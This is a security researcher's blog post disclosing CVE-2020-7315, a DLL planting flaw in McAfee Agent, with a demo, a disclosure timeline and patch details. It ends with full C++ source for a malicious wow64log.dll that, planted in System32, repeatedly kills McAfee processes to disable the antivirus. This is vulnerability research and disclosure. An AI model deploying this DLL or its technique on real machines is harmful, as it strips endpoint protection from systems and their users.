<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="description" content="DLL injection in McAfee Agent allowing a local administrator to kill the antivirus, or tamper with it, without knowing the McAfee passwordThe macompatsvc.exe...">
  <meta name="keywords" content="cnotin, Cl√©ment Notin, pentest, penetration testing, security research, red team, infosec, cyber security, cyber, hack, cve, vulnerability, exploit, hacking, and information security">
    
  <meta name="author" content="Cl√©ment Notin">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="theme-color" content="#f5f5f5">

  <!-- Twitter Tags -->
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="CVE-2020-7315 McAfee Agent DLL injection | Cl√©ment Notin | Blog">
  <meta name="twitter:description" content="DLL injection in McAfee Agent allowing a local administrator to kill the antivirus, or tamper with it, without knowing the McAfee passwordThe macompatsvc.exe...">
  
  <meta property="twitter:image" content="https://clement.notin.org/img/logo_mcafee.jpg">
  

  <!-- Open Graph Tags -->
  <meta property="og:type" content="blog">
  <meta property="og:url" content="https://clement.notin.org/blog/2020/09/12/CVE-2020-7315-McAfee-Agent-DLL-injection/">
  <meta property="og:title" content="CVE-2020-7315 McAfee Agent DLL injection | Cl√©ment Notin | Blog">
  <meta property="og:description" content="DLL injection in McAfee Agent allowing a local administrator to kill the antivirus, or tamper with it, without knowing the McAfee passwordThe macompatsvc.exe...">
  
  <meta property="og:image" content="https://clement.notin.org/img/logo_mcafee.jpg">
  
  <title>CVE-2020-7315 McAfee Agent DLL injection | Cl√©ment Notin | Blog</title>

  <!-- CSS files -->
  <link rel="stylesheet" href="/css/font-awesome.min.css">
  <link rel="stylesheet" href="/css/main.css">

  <link rel="canonical" href="/blog/2020/09/12/CVE-2020-7315-McAfee-Agent-DLL-injection/">
  <link rel="alternate" type="application/rss+xml" title="Cl√©ment Notin | Blog" href="/feed.xml" />

  <!-- Icons -->
  <link rel="shortcut icon" href="https://clement.notin.org/img/icons/favicon.ico">
  <link rel="icon" type="image/png" sizes="32x32" href="https://clement.notin.org/img/icons/favicon-32x32.png"/>
  <link rel="icon" type="image/png" sizes="16x16" href="https://clement.notin.org/img/icons/favicon-16x16.png"/>

  <link rel="apple-touch-icon" sizes="180x180" href="https://clement.notin.org/img/icons/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="https://clement.notin.org/img/icons/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="https://clement.notin.org/img/icons/favicon-16x16.png">
  <link rel="manifest" href="https://clement.notin.org/img/icons/site.webmanifest">
  <link rel="mask-icon" href="https://clement.notin.org/img/icons/safari-pinned-tab.svg" color="#5bbad5">
  <meta name="msapplication-TileColor" content="#da532c">

  
  <!-- Asynchronous Google Analytics snippet -->
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-125271582-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-125271582-1');
  </script>
  

  <a rel="me" href="https://infosec.exchange/@cnotin"></a>
</head>

<body>
  <header>
    <div class="cover row">
      

<div class="col s6 m6 l12">
  <a href="/">
    <img src="/img/avatar.jpg" alt="" class="avatar">
    <span class="author_name">Cl√©ment Notin</span>
    <span class="author_job">Pentester / Security researcher</span>
  </a>
</div>
<div class="col s6 m6 l12">
  <span class="author_bio mbm">Sharing my discoveries in pentesting and security research.</span>
  <nav class="nav">
    <ul class="nav-list">
      <li class="nav-item">
        <a href="/">home</a>
      </li>
      
        
      
        
        <li class="nav-item">
          <a href="/about">About</a>
        </li>
        
      
        
        <li class="nav-item">
          <a href="/archive">Archive</a>
        </li>
        
      
        
      
        
      
        
      
        
        <li class="nav-item">
          <a href="/talks">Talks</a>
        </li>
        
      
        
        <li class="nav-item">
          <a href="/tools">Tools</a>
        </li>
        
      
        
        <li class="nav-item">
          <a href="/vulnerabilities">Vulnerabilities</a>
        </li>
        
      
        
      
        
      
        
      
        
      
        
      
    </ul>
  </nav>
  <script type="text/javascript">
  // based on http://stackoverflow.com/a/10300743/280842
  function gen_mail_to_link(lhs, rhs, subject) {
    document.write("<a class=\"social-link-item\" target=\"_blank\" href=\"mailto");
    document.write(":" + lhs + "@");
    document.write(rhs + "?subject=" + subject + "\"><i class=\"fa fa-fw fa-envelope\"></i><\/a>");
  }
</script>
<div class="social-links">
  <ul>
    <li>
    <script>gen_mail_to_link('blog', 'notin.org', 'Hello from website');</script>
    </li><li><a href="https://twitter.com/cnotin" class="social-link-item" target="_blank"><i class="fa fa-fw fa-twitter"></i></a></li><li><a href="https://linkedin.com/in/clementnotin" class="social-link-item" target="_blank"><i class="fa fa-fw fa-linkedin"></i></a></li><li><a href="https://github.com/cnotin" class="social-link-item" target="_blank"><i class="fa fa-fw fa-github"></i></a></li>
    
    <li><a href="/feed.xml" class="social-link-item" target="_blank"><i class="fa fa-fw fa-rss"></i></a></li>
  </ul>
</div>

</div>
    </div>
  </header>
  <section class="post-listing">
    <div id="post">
  <header class="post-header">
    <h1 title="CVE-2020-7315 McAfee Agent DLL injection">CVE-2020-7315 McAfee Agent DLL injection</h1>
    <span class="post-meta">
      <span class="post-date">
        12 SEP 2020
      </span>
      
      ‚Ä¢
      
        <span class="post-cat">CVE</span>
        
      
      

      

    </span>

  </header>

  <article class="post-content">
    
      <div class="post-image-feature">
        <img class="feature-image webfeedsFeaturedVisual" src="/img/logo_mcafee.jpg" alt="CVE-2020-7315 McAfee Agent DLL injection feature image" style="float: left" />
      </div>
    

    <p><em>DLL injection in McAfee Agent allowing a local administrator to kill the antivirus, or tamper with it, without knowing the McAfee password</em></p>

<p>The <code class="language-plaintext highlighter-rouge">macompatsvc.exe</code> McAfee Agent process tries to load the missing <code class="language-plaintext highlighter-rouge">wow64log.dll</code> DLL file (in <code class="language-plaintext highlighter-rouge">System32</code>). By DLL planting a malicious file, a local Windows administrator can achieve code execution in the context of this trusted McAfee process and kill other McAfee processes thus achieving a denial of service on the antivirus which cannot detect and clean viruses anymore.</p>

<!--more-->
<div style="clear: both;"></div>
      <h2 id="mcafee-description">
        
        
          McAfee description <a href="#mcafee-description" class="anchor">üîó</a>
        
        
      </h2>
    

<blockquote>
  <p>DLL Injection Vulnerability in McAfee Agent (MA) for Windows prior to 5.6.6 allows local users to execute arbitrary code via careful placement of a malicious DLL.</p>
</blockquote>
      <h2 id="video">
        
        
          Video <a href="#video" class="anchor">üîó</a>
        
        
      </h2>
    

<iframe style="display: block; margin: auto;" width="560" height="315" src="https://www.youtube.com/embed/bryoavSkE7I" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>

<p>McAfee Endpoint Security (ENS) version 10.7.0.1285 in trial license is installed. Threat prevent module is in version 10.7.0.1399. McAfee agent is in version 5.6.1.308. AV works properly as shown when the EICAR file is automatically detected and deleted üëå</p>

<p>As admin, we copy the malicious wow64log.dll file into System32 and reboot the system ü•Å</p>

<p>After reboot, when we look at McAfee processes we notice something strange: several processes abnormally die and restart. We have the proof that our wow64log.dll was indeed loaded in macompatsvc.exe:</p>

<p><img src="/img/macompatsvc_loads_wow64log.png" alt="" /></p>

<p>We look into the pwn.txt file where the DLL writes its output. We also see that it started killing other McAfee processes. It succeeds for most of them and fails only for a few. Still, we can see that the antivirus is now broken: üí£</p>

<ul>
  <li>it doesn‚Äôt report in the Windows security center</li>
  <li>its interface shows ‚ÄúError communicating with Event Log‚Äù</li>
  <li>the same eicar.txt/eicar.com file is not detected automatically and we cannot even scan it manually</li>
</ul>

<p><img src="/img/03-_mcafee_ko.png" alt="" /></p>

<p>We can stop this attack by deleting the DLL file. But since it is now loaded we cannot delete it normally. So we use <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/pendmoves">Sysinternals‚Äô movefile</a> to mark it for deletion at reboot.</p>

<p>We reboot once again. We just get a look at macompatsvc.exe‚Äôs file version for reference. And now, since our wow64log.dll was properly deleted, we can see that McAfee starts working properly again by detecting and deleting the eicar.com file that was left üëå</p>
      <h2 id="trusted-process">
        
        
          Trusted process? <a href="#trusted-process" class="anchor">üîó</a>
        
        
      </h2>
    

<p>As we can expect, McAfee ENS has a self-protection mechanism where even administrators cannot terminate nor inject into McAfee processes. But it seems that all processes of the McAfee family consider other McAfee processes as ‚Äútrusted‚Äù with regards to self-protection. So, if we manage to execute code in the context of one, we could ‚Äúattack‚Äù and kill others!</p>

<p>If I remember correctly, I got the idea from a researcher‚Äôs blogpost, where they managed to inject in a benign process of an EDR or antivirus then succeeded in killing the others in the same fashion. Unfortunately I couldn‚Äôt find it again and I apologize. Please let me know if that rings a bell on your side!</p>
      <h2 id="how-did-i-find-this-dll-planting">
        
        
          üîç¬†How did I find this DLL planting? <a href="#how-did-i-find-this-dll-planting" class="anchor">üîó</a>
        
        
      </h2>
    

<p>To discover that macompatsvc.exe loaded this DLL, I used <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon">Sysinternals‚Äô Procmon</a> in boot log mode with the appropriate filters (something like ‚Äúends with .dll, and file not found‚Äù).</p>

<ul>
  <li>McAfee program vulnerable to DLL planting:</li>
</ul>

<p><code class="language-plaintext highlighter-rouge">C:\Program Files\McAfee\Agent\x86\macompatsvc.exe</code></p>

<ul>
  <li>Malicious DLL location:</li>
</ul>

<p><code class="language-plaintext highlighter-rouge">C:\Windows\System32\wow64log.dll</code></p>

<p>You can find the code of the DLL I created at the end of this post.</p>
      <h2 id="-background-on-wow64logdll">
        
        
          üî¨ Background on wow64log.dll <a href="#-background-on-wow64logdll" class="anchor">üîó</a>
        
        
      </h2>
    

<p>This DLL is apparently related to the WoW64 Windows mechanism which allows running 32-bit programs on 64-bit Windows. This subsystem automatically tries to load it even though it does not seem to exist on any public Windows release.</p>

<p><strong>The key takeway is then that this vulnerability is not restricted to McAfee ENS and other antivirus/EDR might be affected if they have ‚Äútrusted‚Äù 32-bit processes used on 64-bit Windows.</strong></p>

<p>Here are a few articles if you want to deep-dive on this topic:</p>

<ul>
  <li><a href="https://pastebin.com/KHWAEM49" title="https://pastebin.com/KHWAEM49">https://pastebin.com/KHWAEM49</a></li>
  <li><a href="https://pastebin.com/1ji80WWe" title="https://pastebin.com/1ji80WWe">https://pastebin.com/1ji80WWe</a></li>
  <li><a href="https://waleedassar.blogspot.com/search/label/Wow64LogInitialize" title="https://waleedassar.blogspot.com/search/label/Wow64LogInitialize">https://waleedassar.blogspot.com/search/label/Wow64LogInitialize</a></li>
  <li><a href="https://github.com/hfiref0x/UACME/blob/master/Source/Akatsuki/dllmain.c" title="https://github.com/hfiref0x/UACME/blob/master/Source/Akatsuki/dllmain.c">https://github.com/hfiref0x/UACME/blob/master/Source/Akatsuki/dllmain.c</a></li>
  <li><a href="http://skynetzone.pw/threads/nemnogo-ob-ustrojstve-wow64-podgruzhaem-svoju-dll-v-kazhdyj-x86-process-na-x64-os.5377/" title="http://skynetzone.pw/threads/nemnogo-ob-ustrojstve-wow64-podgruzhaem-svoju-dll-v-kazhdyj-x86-process-na-x64-os.5377/">http://skynetzone.pw/threads/nemnogo-ob-ustrojstve-wow64-podgruzhaem-svoju-dll-v-kazhdyj-x86-process-na-x64-os.5377/</a></li>
  <li><a href="https://www.sentinelone.com/blog/deep-hooks-monitoring-native-execution-wow64-applications-part-1" title="https://www.sentinelone.com/blog/deep-hooks-monitoring-native-execution-wow64-applications-part-1">https://www.sentinelone.com/blog/deep-hooks-monitoring-native-execution-wow64-applications-part-1</a></li>
  <li><a href="https://github.com/wbenny/injdrv" title="https://github.com/wbenny/injdrv">https://github.com/wbenny/injdrv</a></li>
  <li><a href="https://wbenny.github.io/2018/11/04/wow64-internals.html" title="https://wbenny.github.io/2018/11/04/wow64-internals.html">https://wbenny.github.io/2018/11/04/wow64-internals.html</a></li>
</ul>

<p>As you can see, special thanks to <a href="http://waleedassar.blogspot.com/">Walied Assar</a> (<a href="https://twitter.com/waleedassar">@waleedassar</a>)</p>
      <h2 id="external-references">
        
        
          External references <a href="#external-references" class="anchor">üîó</a>
        
        
      </h2>
    

<ul>
<li>McAfee Bulletin: <a href="https://kc.mcafee.com/corporate/index?page=content&amp;id=SB10325">McAfee Security Bulletin - McAfee Agent update fixes four vulnerabilities (CVE-2020-7311, CVE-2020-7312, CVE-2020-7314, and CVE-2020-7315)</a></li>
<li>MITRE CVE: <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7315">CVE-2020-7315</a></li>
<li>NIST NVD: <a href="https://nvd.nist.gov/vuln/detail/CVE-2020-7315">CVE-2020-7315</a></li>
</ul>
      <h2 id="timeline-ddmmyyyy">
        
        
          Timeline (DD/MM/YYYY) <a href="#timeline-ddmmyyyy" class="anchor">üîó</a>
        
        
      </h2>
    

<ul>
  <li>25/11/2019: report submitted, targeting versions 10.5.5 and 10.6 at least</li>
  <li>26/11/2019: McAfee acknowledges</li>
  <li>13/01/2020: issue triaged</li>
  <li>11/02/2020: McAfee fails to reproduce on version 10.7, asks for a re-test on the latest version (now available for download as a public trial)</li>
  <li>12/02/2020: I successfully reproduce on 10.7 and create the video</li>
  <li>03/03/2020: vulnerability triaged again</li>
  <li>05/06/2020: McAfee asks for credit preferences</li>
  <li>12/08/2020: <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7315">CVE-2020-7315</a> assigned</li>
  <li>10/09/2020: patch is published for McAfee agent 5.6.6 after a couple delays</li>
  <li>10/09/2020: confirmation that no bounty is proposed by McAfee, apart from acknowledgement</li>
</ul>
      <h2 id="fix-and-variants">
        
        
          Fix and variants <a href="#fix-and-variants" class="anchor">üîó</a>
        
        
      </h2>
    

<p>Working with McAfee team on this bug was very pleasant, but I decided not to invest more time in verifying the fix and looking for eventual variants (with wow64log.dll, or even other DLLs).</p>
      <h2 id="implementation-for-malicious-wow64logdll">
        
        
          Implementation for malicious wow64log.dll <a href="#implementation-for-malicious-wow64logdll" class="anchor">üîó</a>
        
        
      </h2>
    

<p>The malicious DLL works by verifying, when loaded in a process, that it is an interesting McAfee process, otherwise it does nothing. If it is a McAfee process, when the exported Wow64LogInitialize() function will be called, it will start a thread that will list processes and kill all targeted McAfee processes, in loop every 5 minutes.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;tlhelp32.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;map&gt;</span><span class="cp">
</span>
<span class="cp">#define LOG TRUE
</span>
<span class="kt">bool</span> <span class="n">goodprocess</span> <span class="o">=</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="kt">bool</span> <span class="n">threadstarted</span> <span class="o">=</span> <span class="n">FALSE</span><span class="p">;</span>

<span class="n">DWORD</span> <span class="n">WINAPI</span> <span class="nf">MyThreadFunction</span><span class="p">(</span><span class="n">LPVOID</span> <span class="n">lpdwThreadParam</span><span class="p">);</span>
<span class="kt">void</span> <span class="nf">log</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">msg</span><span class="p">);</span>


<span class="kt">void</span> <span class="nf">KillAllUndesired</span><span class="p">()</span>
<span class="p">{</span>
	<span class="n">HANDLE</span> <span class="n">p</span><span class="p">,</span> <span class="n">toolhelp</span><span class="p">;</span>

	<span class="c1">// snapshot all running processes</span>
	<span class="n">toolhelp</span> <span class="o">=</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPPROCESS</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">toolhelp</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="k">return</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="n">PROCESSENTRY32</span> <span class="n">pe</span><span class="p">;</span>
	<span class="n">pe</span><span class="p">.</span><span class="n">dwSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PROCESSENTRY32</span><span class="p">);</span>

	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">Process32First</span><span class="p">(</span><span class="n">toolhelp</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe</span><span class="p">))</span>
	<span class="p">{</span>
		<span class="n">CloseHandle</span><span class="p">(</span><span class="n">toolhelp</span><span class="p">);</span>  <span class="c1">// clean the snapshot object</span>
		<span class="k">return</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="c1">// iterate on all found processes</span>
	<span class="k">do</span> <span class="p">{</span>
		<span class="c1">// is it a McAfee process we would like to kill?</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">pe</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">,</span> <span class="s">"mfemactl.exe"</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span>
			<span class="o">||</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">pe</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">,</span> <span class="s">"macmnsvc.exe"</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span>
			<span class="o">||</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">pe</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">,</span> <span class="s">"masvc.exe"</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span>
			<span class="o">||</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">pe</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">,</span> <span class="s">"mfeesp.exe"</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span>
			<span class="o">||</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">pe</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">,</span> <span class="s">"mfehcs.exe"</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span>
			<span class="o">||</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">pe</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">,</span> <span class="s">"mfemms.exe"</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span>
			<span class="o">||</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">pe</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">,</span> <span class="s">"mcshield.exe"</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span>
			<span class="o">||</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">pe</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">,</span> <span class="s">"mfetp.exe"</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span>
			<span class="o">||</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">pe</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">,</span> <span class="s">"mfevtps.exe"</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span>
			<span class="o">||</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">pe</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">,</span> <span class="s">"mfefire.exe"</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span>
			<span class="o">||</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">pe</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">,</span> <span class="s">"mfefw.exe"</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span>
			<span class="o">||</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">pe</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">,</span> <span class="s">"scanhost.exe"</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span>
			<span class="p">)</span>
		<span class="p">{</span>
			<span class="c1">// yes! kill it!</span>
			<span class="kt">char</span> <span class="n">msg</span><span class="p">[</span><span class="mi">512</span><span class="p">]</span> <span class="o">=</span> <span class="s">""</span><span class="p">;</span>
			<span class="n">sprintf</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="s">"found process %s"</span><span class="p">,</span> <span class="n">pe</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">);</span>
			<span class="n">log</span><span class="p">(</span><span class="n">msg</span><span class="p">);</span>

			<span class="n">p</span> <span class="o">=</span> <span class="n">OpenProcess</span><span class="p">(</span><span class="n">PROCESS_TERMINATE</span><span class="p">,</span> <span class="nb">false</span><span class="p">,</span> <span class="n">pe</span><span class="p">.</span><span class="n">th32ProcessID</span><span class="p">);</span>
			<span class="kt">bool</span> <span class="n">res</span> <span class="o">=</span> <span class="n">TerminateProcess</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
			<span class="k">if</span> <span class="p">(</span><span class="n">res</span><span class="p">)</span>
			<span class="p">{</span>
				<span class="n">log</span><span class="p">(</span><span class="s">"kill success"</span><span class="p">);</span>
			<span class="p">}</span>
			<span class="k">else</span>
			<span class="p">{</span>
				<span class="n">log</span><span class="p">(</span><span class="s">"kill fail"</span><span class="p">);</span>
			<span class="p">}</span>
		<span class="p">}</span>

	<span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">Process32Next</span><span class="p">(</span><span class="n">toolhelp</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe</span><span class="p">));</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="n">log</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">msg</span><span class="p">)</span>
<span class="p">{</span>
<span class="cp">#if LOG
</span>	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">goodprocess</span><span class="p">)</span> <span class="k">return</span><span class="p">;</span>

	<span class="kt">char</span> <span class="n">szFileName</span><span class="p">[</span><span class="n">MAX_PATH</span> <span class="o">+</span> <span class="mi">1</span><span class="p">];</span>
	<span class="n">GetModuleFileNameA</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">szFileName</span><span class="p">,</span> <span class="n">MAX_PATH</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>

	<span class="kt">char</span> <span class="n">log</span><span class="p">[</span><span class="mi">512</span><span class="p">]</span> <span class="o">=</span> <span class="s">""</span><span class="p">;</span>
	<span class="n">snprintf</span><span class="p">(</span><span class="n">log</span><span class="p">,</span> <span class="mi">512</span><span class="p">,</span> <span class="s">"MCAFKILL [%s] %s</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">szFileName</span><span class="p">,</span> <span class="n">msg</span><span class="p">);</span>

	<span class="n">OutputDebugString</span><span class="p">(</span><span class="n">log</span><span class="p">);</span>

	<span class="kt">FILE</span> <span class="o">*</span><span class="n">f</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"c:</span><span class="se">\\</span><span class="s">programdata</span><span class="se">\\</span><span class="s">pwn.txt"</span><span class="p">,</span> <span class="s">"a"</span><span class="p">);</span>
	<span class="n">fprintf</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">log</span><span class="p">);</span>
	<span class="n">fclose</span><span class="p">(</span><span class="n">f</span><span class="p">);</span>
<span class="cp">#endif
</span><span class="p">}</span>

<span class="n">DWORD</span> <span class="n">WINAPI</span> <span class="n">MyThreadFunction</span><span class="p">(</span><span class="n">LPVOID</span> <span class="n">lpdwThreadParam</span><span class="p">)</span> <span class="p">{</span>
	<span class="c1">// thread main, kill all undesired McAfee processes every few seconds</span>
	<span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">KillAllUndesired</span><span class="p">();</span>
		<span class="n">Sleep</span><span class="p">(</span><span class="mi">5000</span><span class="p">);</span> <span class="c1">// 5s</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>


<span class="kt">void</span> <span class="n">startthread</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">goodprocess</span><span class="p">)</span> <span class="k">return</span><span class="p">;</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">threadstarted</span><span class="p">)</span> <span class="k">return</span><span class="p">;</span>
	<span class="n">threadstarted</span> <span class="o">=</span> <span class="n">TRUE</span><span class="p">;</span>

	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">cthreadid</span><span class="p">;</span>
	<span class="n">CreateThread</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">MyThreadFunction</span><span class="p">,</span> <span class="mi">0L</span><span class="p">,</span> <span class="mi">0L</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cthreadid</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">extern</span> <span class="s">"C"</span>
<span class="p">{</span>
	<span class="kr">__declspec</span><span class="p">(</span><span class="n">dllexport</span><span class="p">)</span> <span class="kt">void</span> <span class="n">Wow64LogSystemService</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="p">{</span>
	<span class="p">}</span>
	<span class="kr">__declspec</span><span class="p">(</span><span class="n">dllexport</span><span class="p">)</span> <span class="kt">int</span> <span class="n">Wow64LogInitialize</span><span class="p">()</span> <span class="p">{</span>
		<span class="c1">//log("Wow64LogInitialize");</span>
		<span class="n">startthread</span><span class="p">();</span>
		<span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="kr">__declspec</span><span class="p">(</span><span class="n">dllexport</span><span class="p">)</span> <span class="kt">void</span> <span class="n">Wow64LogTerminate</span><span class="p">()</span> <span class="p">{</span>
	<span class="p">}</span>
	<span class="kr">__declspec</span><span class="p">(</span><span class="n">dllexport</span><span class="p">)</span> <span class="kt">void</span> <span class="n">Wow64LogMessageArgList</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">StringType</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">pFormatString</span><span class="p">,</span> <span class="kt">void</span><span class="o">*</span> <span class="n">pArguments</span><span class="p">)</span> <span class="p">{</span>
	<span class="p">}</span>
	<span class="c1">// export to be called manually with rundll32 for tests or debug in VS</span>
	<span class="kr">__declspec</span><span class="p">(</span><span class="n">dllexport</span><span class="p">)</span> <span class="kt">void</span> <span class="n">test</span><span class="p">()</span>
	<span class="p">{</span>
		<span class="c1">//KillAllUndesired();</span>
		<span class="n">MyThreadFunction</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span>
		<span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span> <span class="n">Sleep</span><span class="p">(</span><span class="mi">100</span><span class="p">);</span> <span class="p">}</span>
	<span class="p">}</span>
<span class="p">}</span>

<span class="n">BOOL</span> <span class="n">APIENTRY</span> <span class="n">DllMain</span><span class="p">(</span><span class="n">HMODULE</span> <span class="n">hModule</span><span class="p">,</span>
	<span class="n">DWORD</span>  <span class="n">ul_reason_for_call</span><span class="p">,</span>
	<span class="n">LPVOID</span> <span class="n">lpReserved</span>
<span class="p">)</span>
<span class="p">{</span>
	<span class="k">switch</span> <span class="p">(</span><span class="n">ul_reason_for_call</span><span class="p">)</span>
	<span class="p">{</span>
	<span class="k">case</span> <span class="n">DLL_PROCESS_ATTACH</span><span class="p">:</span>
		<span class="kt">char</span> <span class="n">szFileName</span><span class="p">[</span><span class="n">MAX_PATH</span> <span class="o">+</span> <span class="mi">1</span><span class="p">];</span>
		<span class="n">GetModuleFileNameA</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">szFileName</span><span class="p">,</span> <span class="n">MAX_PATH</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>

		<span class="n">log</span><span class="p">(</span><span class="s">"DLL loaded"</span><span class="p">);</span>

		<span class="c1">//check if we are injected in an interesting McAfee process</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">szFileName</span><span class="p">,</span> <span class="s">"macompatsvc"</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span>
			<span class="c1">//|| strstr(szFileName, "mcshield") != NULL</span>
			<span class="o">||</span> <span class="n">strstr</span><span class="p">(</span><span class="n">szFileName</span><span class="p">,</span> <span class="s">"scanhost.exe"</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span>
			<span class="p">)</span> <span class="p">{</span>
			<span class="n">goodprocess</span> <span class="o">=</span> <span class="n">TRUE</span><span class="p">;</span>
			<span class="n">log</span><span class="p">(</span><span class="s">"valid process: continue"</span><span class="p">);</span>
		<span class="p">}</span>
		<span class="k">else</span>
		<span class="p">{</span>
			<span class="n">log</span><span class="p">(</span><span class="s">"invalid process: exit"</span><span class="p">);</span>
			<span class="n">goodprocess</span> <span class="o">=</span> <span class="n">FALSE</span><span class="p">;</span>
		<span class="p">}</span>

		<span class="k">break</span><span class="p">;</span>
	<span class="k">case</span> <span class="n">DLL_THREAD_ATTACH</span><span class="p">:</span>
	<span class="k">case</span> <span class="n">DLL_THREAD_DETACH</span><span class="p">:</span>
	<span class="k">case</span> <span class="n">DLL_PROCESS_DETACH</span><span class="p">:</span>
		<span class="c1">//log("detach");</span>
		<span class="k">break</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
